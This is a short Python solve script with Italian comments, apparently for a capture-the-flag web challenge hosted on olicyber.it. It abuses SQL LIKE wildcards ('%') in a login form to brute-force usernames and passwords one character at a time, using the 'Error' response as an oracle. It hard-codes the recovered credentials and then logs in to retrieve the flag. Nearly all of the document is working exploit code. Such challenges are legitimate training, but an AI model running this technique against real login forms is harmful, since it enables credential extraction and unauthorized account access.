import requests, string
site = "http://m0lecon-plus.challs.olicyber.it/"
users = ['admin', 'alice', 'bob', 'john']
def crackUsers(username):
    print("Parte di username: " + username)
    init = len(username)
    r = requests.post(site, data={"username":username, "password":"%"})
    if not "Error" in r.text and len(username) > 0:
        print("USERNAME TROVATO: " + username)
        users.append(username)
        return
    for i in string.ascii_lowercase:
        r = requests.post(site, data={"username":username + i + "%", "password":"%"})
        if not "Error" in r.text:
            username += i
            print(username)
            crackUsers(username)
            username = username[:-1]
            continue
        else:
            print(f"NO {i}")
    if len(username) == init:
        return
'''
for i in string.ascii_lowercase:
    crackUsers(i)
    PRECALCOLATI
'''
dictUsers = {'admin': 'lphyeyf36dqky5vx', 'alice': '2jxzxr7cj2xfnwys', 'bob': 'xh64xtmrrjxlc8s3', 'john': 'nvb3ztamyyk9xkmr'}
def crackPasswords(username):
    password = ""
    while True:
        r = requests.post(site, data={"username":username, "password":password})
        if not "Error" in r.text and len(password) > 0:
            print(f"PASSWORD trovata: {username} {password}")
            dictUsers[username] = password
            return
        for i in string.printable:
            r = requests.post(site, data={"username":username, "password":password + i + "%"})
            if not "Error" in r.text and i != "%" and i != "_":
                password += i
                print(password)
                break
            else:
                print(f"NO {i}")
        if len(password) == 0:
            return
'''
for i in users:
    print(i)
    crackPasswords(i)
    PRECALCOLATI
'''

for i in dictUsers:
    r = requests.post(site, data={"username":i, "password":dictUsers[i]})
    if "ptm" in r.text:
        print(r.text)
